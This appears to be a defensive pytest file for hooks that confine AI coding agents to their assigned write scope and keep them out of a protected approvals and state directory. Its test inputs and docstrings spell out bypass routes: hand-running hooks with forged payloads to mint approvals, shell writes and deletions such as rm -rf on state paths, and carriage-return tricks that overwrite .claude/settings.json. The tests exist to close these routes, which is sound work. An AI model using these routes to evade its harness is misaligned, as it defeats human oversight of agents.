    one place `_kernel` installs the guard over (`_HOOKS_DIR`)."""
    sys.path.insert(0, TEAM_KITS)
    from kernel.hashing import is_kit_dir
    guarded = [os.path.join(TEAM_KITS, name, "hooks")
               for name in sorted(os.listdir(TEAM_KITS))
               if is_kit_dir(os.path.join(TEAM_KITS, name))]
    assert guarded, "no kit directories found -- the derivation, not the kits, changed"
    offenders = []
    for directory in guarded:
        if not os.path.isdir(directory):
            continue
        for entry in sorted(os.listdir(directory)):
            if entry.endswith(".py"):
                name = entry[:-3]
            elif os.path.isfile(os.path.join(directory, entry, "__init__.py")):
                name = entry
            else:
                continue
            if name in sys.stdlib_module_names:
                offenders.append(os.path.join(directory, entry))
    assert not offenders, (
        "these modules are named after a standard-library module, which "
        "`_kernel._StandardLibraryWins` would answer from the standard library instead of from the "
        "kit: %s" % offenders)


def test_a_specialist_may_not_write_another_tasks_staging(tmp_path):
    _state, _task = bound_repo(tmp_path)
    payload = write_payload(tmp_path, tmp_path / "project_memory" / "staging" / "TSK-9999"
                            / "proposal.html", agent_id="child-1")
    result = run_scope(tmp_path, payload)
    assert result.returncode == 2
    assert "another task's staging" in result.stderr


def test_staging_root_itself_is_not_writable(tmp_path):
    _state, _task = bound_repo(tmp_path)
    payload = write_payload(tmp_path, tmp_path / "project_memory" / "staging" / "loose.txt",
                            agent_id="child-1")
    assert run_scope(tmp_path, payload).returncode == 2


def test_a_bound_specialist_writes_inside_its_scope(tmp_path):
    _state, _task = bound_repo(tmp_path)
    payload = write_payload(tmp_path, tmp_path / "src" / "checkout.py", agent_id="child-1")
    assert run_scope(tmp_path, payload).returncode == 0


def test_a_bound_specialist_cannot_write_outside_its_scope(tmp_path):
    """The work order says `allowed_scope: ["src/"]`; anything else is a scope change, and scope
    changes are the user's."""
    _state, _task = bound_repo(tmp_path)
    payload = write_payload(tmp_path, tmp_path / "frontend" / "App.tsx", agent_id="child-1")
    result = run_scope(tmp_path, payload)
    assert result.returncode == 2
    assert "allowed_scope" in result.stderr


def test_forbidden_scope_wins(tmp_path):
    _state, _task = bound_repo(tmp_path, allowed_scope=["**"], forbidden_scope=["secrets/"])
    payload = write_payload(tmp_path, tmp_path / "secrets" / "keys.env", agent_id="child-1")
    result = run_scope(tmp_path, payload)
    assert result.returncode == 2
    assert "forbidden_scope" in result.stderr


def test_an_unbound_subagent_writes_nothing(tmp_path):
    """The other half of the ambiguity decision in gate_dispatch: a child the kernel refused to
    bind starts anyway (SubagentStart cannot block), and THIS is where that costs it."""
    dispatched_repo(tmp_path)
    payload = write_payload(tmp_path, tmp_path / "src" / "checkout.py", agent_id="stranger")
    result = run_scope(tmp_path, payload)
    assert result.returncode == 2
    assert "not bound to a task" in result.stderr


def test_a_write_outside_the_repo_is_not_this_gates_business(tmp_path):
    dispatched_repo(tmp_path)
    payload = write_payload(tmp_path, tmp_path.parent / "elsewhere.txt", agent_id="stranger")
    assert run_scope(tmp_path, payload).returncode == 0


# -- the shell half: condition (i) and the Bash bypass -------------------------

@pytest.mark.parametrize("command", [
    "python .claude/hooks/gate_approval.py < forged.json",
    'bash -lc "python .claude/hooks/gate_approval.py < forged.json"',
    "python C:/proj/.claude/hooks/gate_dispatch.py",
    ".claude/hooks/gate_approval.py",
])
def test_running_a_hook_by_hand_is_refused(tmp_path, command):
    """The path the approval protocol could not close in-process: a hook run by hand with a forged
    payload mints. Hooks are invoked by the platform; an agent running one is either forging or
    confused."""
    dispatched_repo(tmp_path)
    result = run_scope(tmp_path, shell_payload(tmp_path, command))
    assert result.returncode == 2
    assert "enforcement layer" in result.stderr


def test_reading_a_hook_stays_allowed(tmp_path):
    """A blocked agent must be able to find out WHY; reading the gate is legitimate."""
    dispatched_repo(tmp_path)
    for command in ("cat .claude/hooks/gate_approval.py",
                    "grep -n mint .claude/hooks/gate_approval.py"):
        assert run_scope(tmp_path, shell_payload(tmp_path, command)).returncode == 0, command


def test_inline_python_against_the_kernel_is_refused(tmp_path):
    dispatched_repo(tmp_path)
    command = 'python -c "from kernel.approvals import mint; mint(1,2,3)"'
    result = run_scope(tmp_path, shell_payload(tmp_path, command))
    assert result.returncode == 2
    assert "reaches into the state kernel" in result.stderr


def test_the_vetted_cli_surface_stays_allowed(tmp_path):
    """The entry point and the kernel CLI go through the automaton and the approval checks;
    blocking them would leave no sanctioned way to move state at all.

    The spelling comes from `kernel.cli.INVOCATION`, so this measures the line a role is actually
    told to type. `--root` is deliberately absent from it: the entry point resolves the state
    directory itself precisely because this gate refuses a write-capable pipeline that names it,
    and `test_the_entry_point_refuses_the_one_argument_the_write_gate_would_refuse` measures both
    halves of that."""
    sys.path.insert(0, TEAM_KITS)
    from kernel import cli
    dispatched_repo(tmp_path)
    for command in ("%s validate" % cli.INVOCATION, "python -m kernel.cli generate-index",
                    "%s transition TSK-0001 READY" % cli.INVOCATION):
        assert run_scope(tmp_path, shell_payload(tmp_path, command)).returncode == 0, command


@pytest.mark.parametrize("command", [
    "echo x > project_memory/product/active/PR-0001.yaml",
    "cp /tmp/forged.yaml project_memory/approvals/pending/deadbeef.yaml",
    "rm project_memory/approvals/revoked/x.yaml",
    'Set-Content -Path project_memory/approvals/APR-0001.yaml -Value "revoked: false"',
])
def test_shell_writes_into_the_state_dir_are_refused(tmp_path, command):
    """Shell writes bypass every Edit/Write guard — guard_harness_selfmod has said so since V1, and
    this is the gate that stops relying on goodwill."""
    dispatched_repo(tmp_path)
    result = run_scope(tmp_path, shell_payload(tmp_path, command))
    assert result.returncode == 2
    assert "canonical state directory" in result.stderr


def test_reading_the_state_dir_from_a_shell_stays_allowed(tmp_path):
    dispatched_repo(tmp_path)
    for command in ("cat project_memory/generated/index.yaml",
                    "ls project_memory/approvals",
                    "git diff project_memory"):
        assert run_scope(tmp_path, shell_payload(tmp_path, command)).returncode == 0, command


def test_a_commit_message_mentioning_the_state_dir_is_not_a_write(tmp_path):
    """Quoted prose is prose: the `-m` payload is removed before the code view is tokenised, so a
    commit message about project_memory does not read as a write into it."""
    dispatched_repo(tmp_path)
    command = 'git commit -m "docs: explain why project_memory > everything else"'
    assert run_scope(tmp_path, shell_payload(tmp_path, command)).returncode == 0


# -- gate_write_scope: the shapes a lexical check gets wrong ------------------

@pytest.mark.parametrize("spelling", ["Project_Memory", "PROJECT_MEMORY", "pRoJeCt_MeMoRy"])
def test_the_state_dir_is_matched_case_insensitively(tmp_path, spelling):
    """The FS on Windows is case-insensitive, so a lexical comparison that is not was no
    comparison at all: `Project_Memory/approvals/pending/x.yaml` reached the REAL file while the
    gate saw an unrelated path. guard_harness_selfmod learned this in V1; this gate had to too."""
    dispatched_repo(tmp_path)
    target = tmp_path / spelling / "approvals" / "APR-0001.yaml"
    result = run_scope(tmp_path, write_payload(tmp_path, target))
    assert result.returncode == 2
    assert "canonical project state" in result.stderr


def test_a_junction_into_the_state_dir_is_resolved(tmp_path):
    """`mklink /J` needs no admin rights, and afterwards a second name reaches the same files. The
    TARGET side is realpath'd for exactly this (find_repo_root stays lexical, as documented)."""
    dispatched_repo(tmp_path)
    link = tmp_path / "pm"
    try:
        os.symlink(str(tmp_path / "project_memory"), str(link), target_is_directory=True)
    except (OSError, NotImplementedError, AttributeError):
        pytest.skip("no permission to create a directory link on this host")
    result = run_scope(tmp_path, write_payload(tmp_path, link / "approvals" / "APR-0001.yaml"))
    assert result.returncode == 2
    assert "canonical project state" in result.stderr


@pytest.mark.skipif(os.name != "nt",
                    reason="an extended-length `\\\\?\\Z:` spelling is a Windows path shape; on "
                           "POSIX it is one ordinary file name inside the project, which the gate "
                           "CAN place -- so there is no undecidable path here to refuse")
def test_an_unresolvable_path_is_refused_not_skipped(tmp_path):
    """"Cannot decide" must not read as "allowed" — an extended-length or other-drive spelling used
    to fall into a branch commented "not this repo's business".

    The undecidable spelling is the Windows one, and asserting its refusal on a POSIX host asserted
    that an ordinary in-project file name must be refused: red on the hosted ubuntu runner, and
    right to be (BUG-0069). Same shape as the cross-drive and junction skips further down."""
    dispatched_repo(tmp_path)
    result = run_scope(tmp_path, write_payload(tmp_path, "\\\\?\\Z:\\nope\\x.yaml"))
    assert result.returncode == 2


def test_a_sibling_directory_is_not_the_state_dir(tmp_path):
    """The counterpart: `project_memory_backup/` must stay writable, or the case fix would have
    turned into a prefix-confusion bug."""
    _state, _task = bound_repo(tmp_path, allowed_scope=["**"])
    payload = write_payload(tmp_path, tmp_path / "project_memory_backup" / "x.yaml",
                            agent_id="child-1")
    assert run_scope(tmp_path, payload).returncode == 0


# -- scope entries: the notations a PM actually writes ------------------------

@pytest.mark.parametrize("entry,target,allowed", [
    ("src/**", "src/a.py", True),
    ("src/**", "frontend/a.tsx", False),
    ("src/*.py", "src/a.py", True),
    ("src/*.py", "src/sub/a.py", False),
    (".github/workflows/", ".github/workflows/ci.yml", True),
    (".claude/agents/", ".claude/agents/x.md", True),
])
def test_scope_entries_mean_what_a_pm_would_expect(tmp_path, entry, target, allowed):
    """Two bugs met here. `**` is the notation every message in the kit uses, and treating it as
    literal text made `allowed_scope: ["src/**"]` a dead task. And `lstrip("./")` strips a
    character SET, so `.env` became `env` and `.github/workflows/` became `github/workflows/` —
    silently unprotecting one path while blocking another."""
    _state, _task = bound_repo(tmp_path, allowed_scope=[entry])
    payload = write_payload(tmp_path, tmp_path / target, agent_id="child-1")
    assert run_scope(tmp_path, payload).returncode == (0 if allowed else 2)


@pytest.mark.parametrize("entry", ["secrets/**", ".env"])
def test_forbidden_entries_mean_what_a_pm_would_expect(tmp_path, entry):
    target = "secrets/keys" if entry.startswith("secrets") else ".env"
    _state, _task = bound_repo(tmp_path, allowed_scope=["**"], forbidden_scope=[entry])
    payload = write_payload(tmp_path, tmp_path / target, agent_id="child-1")
    result = run_scope(tmp_path, payload)
    assert result.returncode == 2
    assert "forbidden_scope" in result.stderr


@pytest.mark.parametrize("field,entry,target", [
    ("forbidden_scope", "secrets", "secrets/keys"),
    ("allowed_scope", "src", "src/a.py"),
])
def test_a_scalar_scope_decides_like_a_one_element_list(tmp_path, field, entry, target):
    """BUG-0015: `_scope_entries` iterated the field itself, so a scope written as a bare string
    became one entry per LETTER.

    None of those letters matches a path, so `forbidden_scope: secrets` was a silent no-op and the
    bound specialist wrote `secrets/keys` at rc 0 — measured against rc 2 for the same task with
    `[secrets]`. `kernel.capture` accepts the scalar and nothing between it and this gate converts
    it, so the spelling reaches the gate exactly as written.

    THE ENTRIES CARRY NO `/` AND NO `*` ON PURPOSE, and that is the measurement rather than a
    simplification: in `secrets/**` the letters `/` and `*` are themselves unusable entries, so
    the blank-entry guard below refuses the call for the wrong reason and the silent no-op is
    hidden. Measured — with `secrets/**` this test stays GREEN against the restored defect.

    The two spellings are COMPARED rather than pinned to an expected code: what an entry MEANS is
    the two tests above, and this one is only about how many entries the field holds."""
    verdicts = []
    for index, value in enumerate((entry, [entry])):
        scopes = {"allowed_scope": ["**"], "forbidden_scope": []}
        scopes[field] = value
        repo = tmp_path / ("spelling-%d" % index)
        bound_repo(repo, **scopes)
        payload = write_payload(repo, repo / target, agent_id="child-1")
        verdicts.append(run_scope(repo, payload).returncode)
    assert verdicts[0] == verdicts[1], verdicts


@pytest.mark.parametrize("entry", ["", ".", "  "])
def test_a_blank_scope_entry_is_refused_not_read_as_everything(tmp_path, entry):
    """`allowed_scope: [""]` used to grant the whole repo while the empty LIST correctly blocked —
    one stray `- ""` in a YAML list switched gate layer 3 off for that task."""
    _state, _task = bound_repo(tmp_path, allowed_scope=[entry])
    payload = write_payload(tmp_path, tmp_path / "anything.txt", agent_id="child-1")
    result = run_scope(tmp_path, payload)
    assert result.returncode == 2
    assert "blank" in result.stderr


def test_an_empty_allowed_scope_blocks(tmp_path):
    _state, _task = bound_repo(tmp_path, allowed_scope=[])
    payload = write_payload(tmp_path, tmp_path / "src" / "a.py", agent_id="child-1")
    result = run_scope(tmp_path, payload)
    assert result.returncode == 2
    assert "nothing is in scope" in result.stderr


def test_forbidden_scope_reaches_into_staging(tmp_path):
    """The two branches used to be exclusive, so a forbid could never reach a state path and a
    `forbidden_scope` naming the state dir was a silent no-op."""
    _state, task = bound_repo(tmp_path, forbidden_scope=["project_memory/staging/"])
    payload = write_payload(tmp_path, tmp_path / "project_memory" / "staging" / task["id"]
                            / "p.html", agent_id="child-1")
    result = run_scope(tmp_path, payload)
    assert result.returncode == 2
    assert "forbidden_scope" in result.stderr


def test_the_pre_task_staging_key_is_the_root_id(tmp_path):
    """spec II.4 names BOTH keys: `staging/<task_id>/` and `staging/<ROOT-ID>/` for a pre-task
    artefact (the class-small WFR before scope approval)."""
    _state, task = bound_repo(tmp_path)
    payload = write_payload(tmp_path, tmp_path / "project_memory" / "staging"
                            / task["product_requirement"] / "WFR-0001.drawio.svg",
                            agent_id="child-1")
    assert run_scope(tmp_path, payload).returncode == 0


# -- tool coverage -------------------------------------------------------------

def _file_write_matcher_tools(script):
    """The tools a gate is REGISTERED to see as file writes - derived, so a gate cannot shrink it.

    Taken from the matcher that names `Write`, because that is the registration whose whole subject
    is writing a file; the gate's own tool tuple cannot be the source here, since it is exactly
    what is under test.

    ACROSS EVERY KIT, as a union. The gate file is one file mirrored into three kits, so its tool
    handling has to answer to every registration any of them writes - reading one kit's
    settings.json made the answer depend on which kit the test happened to name, and a fourth tool
    added to the office kit alone would have been unpinned exactly as `NotebookEdit` once was.
    """
    tools = set()
    for kit in KITS:
        matchers = [m for m in _hook_registrations(kit)[script]["PreToolUse"]
                    if "Write" in _tools_in(m)]
        assert len(matchers) == 1, "%s/%s: %r" % (kit, script, matchers)
        tools |= _tools_in(matchers[0])
    return sorted(tools)


def test_every_tool_the_write_gate_is_registered_for_is_a_write_to_it(tmp_path):
    """A gate that sees only Write scopes everything except the tools it does not see.

    THE TOOL SET COMES FROM settings.json, and that is the whole difference to the three typed
    names that stood here. Reading it from the gate's own `FILE_TOOLS` would make the test agree
    with whatever that tuple happens to hold; typing it out again made the test agree with whoever
    last edited the list — `NotebookEdit` was in it, but only because somebody added it to both
    places on the same day, and the next tool added to the matcher would have been unpinned exactly
    as it was before. A gate registered for a tool it does not handle is the most expensive kind of
    gap: it looks present in the settings file, in the parity matrix and in `python scripts/harness.py doctor`.

    The canonical-state write is the case that must be refused for every one of them: spec II.4
    makes the kernel the only writer of `project_memory/**`, and a notebook is a file like any
    other."""
    dispatched_repo(tmp_path)
    target = tmp_path / "project_memory" / "approvals" / "APR-0001.yaml"
    tools = _file_write_matcher_tools("gate_write_scope.py")
    assert "NotebookEdit" in tools, tools
    for tool in tools:
        payload = write_payload(tmp_path, target, tool=tool)
        if tool == "NotebookEdit":
            # the provider carries a notebook edit's path under `notebook_path`, which is why
            # `_compat.file_paths` reads that key too — the payload shape has to be the real one
            payload["tool_input"] = {"notebook_path": str(target), "new_source": "x"}
        result = run_scope(tmp_path, payload)
        assert result.returncode == 2, (
            "gate_write_scope is registered for %s and let a write to canonical state through "
            "(rc %d): %s" % (tool, result.returncode, result.stderr))


def test_a_multi_file_patch_cannot_smuggle_a_blocked_path(tmp_path):
    """A Codex apply_patch is ONE call touching many files — `_compat.file_paths` exists so a
    single-path check cannot be walked past, and the blocked path is deliberately second here."""
    dispatched_repo(tmp_path)
    patch = ("*** Begin Patch\n*** Update File: src/a.py\n+x\n"
             "*** Update File: project_memory/approvals/APR-0001.yaml\n+y\n*** End Patch\n")
    payload = {"hook_event_name": "PreToolUse", "tool_name": "apply_patch", "cwd": str(tmp_path),
               "tool_input": {"command": patch}}
    assert run_scope(tmp_path, payload).returncode == 2


def test_powershell_is_covered_like_bash(tmp_path):
    dispatched_repo(tmp_path)
    payload = {"hook_event_name": "PreToolUse", "tool_name": "PowerShell", "cwd": str(tmp_path),
               "tool_input": {"command": "Set-Content project_memory/approvals/x.yaml -Value y"}}
    assert run_scope(tmp_path, payload).returncode == 2


def test_a_non_pretooluse_event_does_nothing(tmp_path):
    """The early exit is what makes the missing resolved-event `fail_closed` re-entry safe: every
    reachable block really is a PreToolUse block, so the audit label cannot lie."""
    dispatched_repo(tmp_path)
    payload = write_payload(tmp_path, tmp_path / "project_memory" / "approvals" / "APR-0001.yaml")
    payload["hook_event_name"] = "PostToolUse"
    assert run_scope(tmp_path, payload).returncode == 0


# -- shell: the spellings that slipped through --------------------------------

@pytest.mark.parametrize("command", [
    'echo x > "project_memory/approvals/APR-0001.yaml"',
    "sed -i s/true/false/ project_memory/approvals/APR-0001.yaml",
    "touch project_memory/approvals/pending/deadbeef.yaml",
    "find project_memory -name *.yaml -delete",
    "git checkout HEAD~5 -- project_memory",
    "git restore --source=HEAD~1 project_memory/approvals/APR-0001.yaml",
    "python -c open('project_memory/approvals/APR-0001.yaml','w').write('x')",
])
def test_more_shell_write_spellings_are_refused(tmp_path, command):
    """Quoting the target is the NORMAL spelling, and the prose-stripped view this gate once shared
    deleted quoted spans wholesale — so it missed the path. The verb list grew for the same
    reason."""
    dispatched_repo(tmp_path)
    result = run_scope(tmp_path, shell_payload(tmp_path, command))
    assert result.returncode == 2
    assert "canonical state directory" in result.stderr


def test_a_state_path_broken_over_a_line_continuation_is_still_that_path(tmp_path):
    """This hook kept its own copy of the continuation rule, and its own copy of the bug.

    The shell removes `\\`+newline with NOTHING in its place, so the path below is exactly
    `project_memory/approvals/APR-0001.yaml` and the write lands in the canonical state directory.
    Joining with a SPACE spelled it `project_mem ory/...`, which matches no state-dir pattern, and
    the write was waved through. One rule, one place: `_compat.join_line_continuations`.
    """
    dispatched_repo(tmp_path)
    command = "echo x > project_mem\\\nory/approvals/APR-0001.yaml"
    result = run_scope(tmp_path, shell_payload(tmp_path, command))
    assert result.returncode == 2
    assert "canonical state directory" in result.stderr


# WHAT A GATED SHELL DOES WITH EACH CHARACTER OF THE CLASS A LINE BREAK COULD BE SPELLED IN, probed
# 2026-08-24 against a real `bash.exe` and a real `powershell.exe` with `echo one<CH>echo two` and
# judged on the RAW bytes by whether the second `echo` ran as a COMMAND. `separates` is the answer
# for the pair of them: a character ONE of them honours is honoured, because `tool_name` is the
# caller's choice. The three that merely end a WORD are in the table for the end this rule keeps
# failing at -- under PowerShell they print `one`, `echo` and `two` on three lines, which reads like
# two commands from the outside and made the first version of that probe call them separators.
_BREAK_PROBE = (
    ("\n", "LF", True),
    ("\r", "CR", True),
    ("\t", "tab", False),
    ("\v", "vertical tab", False),
    ("\f", "form feed", False),
    ("\x1c", "file separator", False),
    ("\x7f", "DEL", False),
    ("", "NEL", False),
    (" ", "line separator", False),
    (" ", "paragraph separator", False),
)


@pytest.mark.parametrize("character,what,separates", _BREAK_PROBE)
def test_the_shared_preparation_spells_every_statement_break_as_a_newline(
        character, what, separates):
    """The preparation every command reader in the kit shares hands on ONE spelling of a break.

    Without that, each reader rewrote the break it happened to know: `gate_write_scope` rewrote
    `\\n` and nothing else, so a CR stayed ordinary whitespace to `shlex`, the whole line read as
    one pipeline with the harmless verb in front of it, and a write to `.claude/settings.json`
    behind a CR was rc 0 in all three kits while PowerShell ran it (`BUG-0066`; the refusal end is
    `test_a_carriage_return_does_not_hide_a_write_from_the_scope_gate`).

    Both ends are measured here, and the second is the one that keeps the rule from becoming "refuse
    everything unusual": a character the shells do NOT end a statement at survives untouched.
    """
    prepared = _compat.join_line_continuations("echo one%secho two" % character)
    assert ("\n" in prepared) is separates, "%s: %r" % (what, prepared)
    assert prepared == ("echo one\necho two" if separates else "echo one%secho two" % character)


def test_a_crlf_is_one_statement_break_and_not_two():
    """The pair is how a Windows editor spells the single break both shells honour there. Rewritten
    per character it would become two, and an empty statement between them is an artefact every
    reader downstream then has to know about."""
    assert _compat.join_line_continuations("echo one\r\necho two") == "echo one\necho two"


@pytest.mark.parametrize("continuation", ["\\", "`"])
def test_a_continuation_is_joined_before_a_break_is_normalised(continuation):
    """The ORDER of the two rewrites, as a property of the TEXT.

    A continuation followed by a CRLF is joined -- a shell that continues a line over its own escape
    character does so over the CRLF spelling of the break too. A continuation followed by a BARE CR
    is not: no gated shell continues there (PowerShell prints `one\\` and `two`, two statements; the
    Bash rail never receives a bare CR at all). Normalising first would spell that pair
    `<cont>`+LF, the continuation rule would eat it, and a break the shell honours would be gone.

    WHAT THIS DOES *NOT* CLAIM, because measuring it said otherwise: it does not decide a verdict
    any more. With the continuation tool-dependent (`_compat._CONTINUATION_BY_TOOL`) and a Bash line
    carrying a bare CR refused outright (`_kernel._EATEN_IN_FLIGHT`), both orders answer rc 2 on
    every line that used to separate them, measured against a real gate process. The order is the
    shell's, and this test pins the text it produces -- not a refusal that depends on it.
    """
    joined = _compat.join_line_continuations("echo one%s\r\necho two" % continuation)
    assert joined == "echo oneecho two"
    kept = _compat.join_line_continuations("echo one%s\recho two" % continuation)
    assert kept == "echo one%s\necho two" % continuation


@pytest.mark.parametrize("kit", KITS)
@pytest.mark.parametrize("tool", ["Bash", "PowerShell"])
def test_a_carriage_return_does_not_hide_a_write_from_the_scope_gate(tmp_path, kit, tool):
    """`BUG-0066`, the refusal end, in every kit and on both tool rails.

    MEASURED END TO END on scaffolded projects outside the repo, all three kits identically: with
    `tool_name: PowerShell`, `Get-Content README.md<CR>Set-Content -Path .claude/settings.json
    -Value …` was rc 0 from the whole registered chain, rc 0 from a real `powershell.exe`, and the
    file the provider reads to learn WHICH hooks run was 31 bytes of poison afterwards -- one call,
    one session. Both rails are asserted because the tool name is the caller's choice, and a refusal
    that depended on it would be decided by the attacker.
    """
    dispatched_repo(tmp_path)
    command = ("Get-Content README.md\rSet-Content -Path .claude/settings.json -Value x"
               if tool == "PowerShell" else "echo hello\rtee .claude/settings.json")
    payload = dict(shell_payload(tmp_path, command), tool_name=tool)
    assert run_scope(tmp_path, payload, kit=kit).returncode == 2, repr(command)


# Lines whose verdict must not depend on WHICH character spells the break in them: a write behind
# the break, a verb the break would tear off its own flag, and two plain reads that must stay
# allowed so the answer to a CR cannot be "refuse every line that carries one".
_SPELLING_INVARIANT = [
    ("a write behind the break",
     "Get-Content README.md%sSet-Content -Path .claude/settings.json -Value x", 2),
    ("a verb and the flag that makes it a write", "rm%s -rf project_memory/decisions", 2),
    ("a state path behind the break", "Get-Content x%sechox > project_memory/x.yaml", 2),
    ("two reads", "git status%sgit diff", 0),
    ("a read and its own flag", "git log%s --oneline", 0),
]


@pytest.mark.parametrize("what,shape,verdict", _SPELLING_INVARIANT)
def test_a_carriage_return_is_read_as_the_newline_it_replaces_and_no_more(
        tmp_path, what, shape, verdict):
    """The counter direction, and the trap the naive variant walked into one round earlier.

    Adding the CR to the SEPARATOR class instead of rewriting it into the newline cuts between a
    verb and the flag that makes it a write, because the rules that put a newline back together
    never see it -- measured in TSK-0083 as `find ledger<CR> -delete && git commit -m x` falling
    from rc 2 to rc 0. Here the property is stated without naming those rules: whatever the gate
    answers for a break, it answers for every spelling of it.

    ON THE POWERSHELL RAIL, because that is where a CR IS a spelling of the break. On the Bash rail
    it is not one -- the tool deletes it before bash parses, so the line bash receives is not the
    line at all, and the answer there is a refusal rather than a reading
    (`test_a_line_carrying_a_character_its_shell_never_sees_is_refused`).
    """
    dispatched_repo(tmp_path)
    for spelling in ("\n", "\r", "\r\n"):
        command = shape % spelling
        payload = dict(shell_payload(tmp_path, command), tool_name="PowerShell")
        result = run_scope(tmp_path, payload)
        assert result.returncode == verdict, "%r: rc %d\n%s" % (
            command, result.returncode, result.stderr)


@pytest.mark.parametrize("kit", KITS)
@pytest.mark.parametrize("what,tool,command,verdict", [
    ("a bare CR welding two words into a state path", "Bash",
     "echo poison > project_mem\\\rory/approvals/APR-0001.yaml", 2),
    ("a bare CR between two reads", "Bash", "git status\rgit diff", 2),
    ("a CRLF, whose LF survives the trip", "Bash", "git status\r\ngit diff", 0),
    ("a plain LF", "Bash", "git status\ngit diff", 0),
    ("no break at all", "Bash", "git status", 0),
    ("the same bare CR where the shell DOES receive it", "PowerShell", "git status\rgit diff", 0),
])
def test_a_line_carrying_a_character_its_shell_never_sees_is_refused(
        tmp_path, kit, what, tool, command, verdict):
    """A gate that reads a different line than the one that runs has inspected nothing.

    MEASURED, by having each gated shell print a string back and comparing the BYTES, over every C0
    control character, DEL, U+0085, U+2028 and U+2029: exactly one character of that class does not
    survive: the CARRIAGE RETURN on the `Bash` rail. What that costs is a WELD --
    `echo poison > project_mem<BS><CR>ory/approvals/APR-0001.yaml` was rc 0 from the whole registered
    chain, rc 0 from a real bash, and the canonical item read `poison` afterwards. WHO deletes it,
    and on which platform that holds, is `_kernel._EATEN_IN_FLIGHT`; it is the shell's own input
    reader rather than the tool, and this test does not restate the measurement.

    THREE COUNTER-ENDS, because a refusal this blunt has to earn its keep: a CRLF is NOT refused
    (its CR is dropped and the LF stays the break it was, so the gate and the shell agree -- and it
    is how every Windows editor spells a line end), a plain LF is not, and the SAME bare CR on the
    PowerShell rail is not, because PowerShell really receives it and really ends a statement there.
    What the refusal costs was measured over this repo's own corpora and belongs in that round's
    report, not in a second copy here: no legitimate command line carries a bare CR, and the ones
    that do are attack forms already asserted as refused.

    The rule lives at the SHARED payload door (`_kernel.payload` -> `_EATEN_IN_FLIGHT`), not in any
    gate, so a gate added later inherits it by asking that door rather than by remembering — and
    which gate of the chain speaks is therefore the first one that asks. NOT "every blocking gate
    goes through it", which is what this said and is measured false: four of the registered shell
    gates reach the payload another way and at least two of them can block. What makes the refusal
    hold for the whole CALL anyway is that `gate_write_scope` is registered on the same event in
    every kit and does ask, and a chain ends at its first refusal.
    """
    dispatched_repo(tmp_path)
    payload = dict(shell_payload(tmp_path, command), tool_name=tool)
    result = run_scope(tmp_path, payload, kit=kit)
    assert result.returncode == verdict, "%r: rc %d\n%s" % (
        command, result.returncode, result.stderr)


def _names_a_carriage_return(pattern):
    """Does this regular expression source name a CARRIAGE RETURN?

    THE PATTERN TEXT is the thing read, and it is the thing that runs — a compiled pattern is that
    string. Behaviour would be the blunter test and a wrong one: `\\s` matches a CR without being a
    second copy of the break rule, and `_NEWLINE_AROUND_PIPE_RX` is built out of it.

    WHAT THIS READER DOES NOT READ, named rather than implied, because a check that hides its own
    blind spot is the one that gets trusted too far: a CR spelled `\\x0d`, `\\015`, `\\N{…}` or
    `chr(13)`, and a pattern assembled from pieces at run time.
    """
    return "\r" in pattern or "\\r" in pattern


def _preparation_callers(kit):
    """The shipped hook modules of `kit` that ask `_compat` for the prepared command text.

    DERIVED from the parsed source rather than listed, because the point of the rule below is the
    caller nobody has written yet.
    """
    hooks = os.path.join(TEAM_KITS, kit, "hooks")
    callers = []
    for name in sorted(os.listdir(hooks)):
        if not name.endswith(".py") or name == "_compat.py":
            continue
        with open(os.path.join(hooks, name), encoding="utf-8") as handle:
            tree = ast.parse(handle.read(), filename=name)
        for node in ast.walk(tree):
            if (isinstance(node, ast.Attribute) and node.attr == "join_line_continuations"
                    and isinstance(node.value, ast.Name) and node.value.id == "_compat"):
                callers.append(name)
                break
    return callers


@pytest.mark.parametrize("kit", KITS)
def test_no_caller_of_the_preparation_keeps_a_second_copy_of_the_break_rule(kit):
    """A gate that asks for the prepared text must not then prepare it again.

    The half of `BUG-0066` that outlives the fix: the rewrite lives INSIDE the preparation now, so a
    caller cannot take the join without it -- but a caller may still add its own, and then there are
    two places for one rule to rot. `gate_ledger_valid` was exactly that, a `\\r\\n?` of its own
    beside the shared one, which is why this reads the pattern a module COMPILES rather than trusting
    that nobody will.

    NOT MEASURED HERE, said rather than implied: a module that never asks for the preparation is
    outside this rule, a copy that is not a compiled pattern is invisible to it, and what counts as
    naming a carriage return is `_names_a_carriage_return`, which states its own blind spots.
    """
    callers = _preparation_callers(kit)
    assert callers, "no shipped hook in %s asks for the prepared command text" % kit
    for name in callers:
        with open(os.path.join(TEAM_KITS, kit, "hooks", name), encoding="utf-8") as handle:
            tree = ast.parse(handle.read(), filename=name)
        for node in ast.walk(tree):
            if not (isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute)
                    and node.func.attr == "compile"):
                continue
            for argument in node.args[:1]:
                if isinstance(argument, ast.Constant) and isinstance(argument.value, str):
                    assert not _names_a_carriage_return(argument.value), "%s/%s compiles %r" % (
                        kit, name, argument.value)


# EVERY WAY THE LINE THAT REACHES THIS TOOL'S SHELL CAN SPELL A STATEMENT BREAK, which is not the
# same set for the two of them and is measured rather than assumed. PowerShell receives and honours
# LF, CR and CRLF. The Bash rail has only two, because the tool deletes a bare CR before bash parses
# and a line carrying one is therefore refused outright rather than read
# (`test_a_line_carrying_a_character_its_shell_never_sees_is_refused`), while the CR of a CRLF is
# dropped and the LF behind it stays the break it was.
_BREAK_SPELLINGS = {
    "Bash": ("\n", "\r\n"),
    "PowerShell": ("\n", "\r", "\r\n"),
}


@pytest.mark.parametrize("kit", KITS)
@pytest.mark.parametrize("tool,shape", [
    ("Bash", "echo hello%stee .claude/settings.json"),
    ("PowerShell", "Get-Content README.md%sSet-Content -Path .claude/settings.json -Value x"),
])
def test_every_registered_shell_gate_answers_every_spelling_of_a_break_alike(
        tmp_path, kit, tool, shape):
    """The tripwire for the gate nobody has written yet: the set of gates is DERIVED from the
    registration by `_registered_shell_gates`, so a new one joins this rule the day it is
    registered.

    Each gate is run on its own, so the answer is that gate's and not the chain's, and each spelling
    is compared against the FIRST one of the same line rather than against a fixed verdict -- what a
    gate refuses is its own business, that it refuses the same however the break is spelled is not.
    Which spellings a rail has is `_BREAK_SPELLINGS`, measured.

    WHAT THIS DOES NOT MEASURE, because the claim would otherwise be bigger than the code: a gate
    that refuses NOTHING in this line is compared as 0 against 0. The line is deliberately one a
    scaffolded project carries without per-gate fixtures; measured 2026-08-24 as real hook
    processes against scaffolded projects of all three kits, `gate_write_scope` is the gate it
    catches, and the gates that answer whole-line questions (`gate_git`, `gate_push_token`,
    `gate_filing`) were blind to the spelling before this round already.
    """
    dispatched_repo(tmp_path)
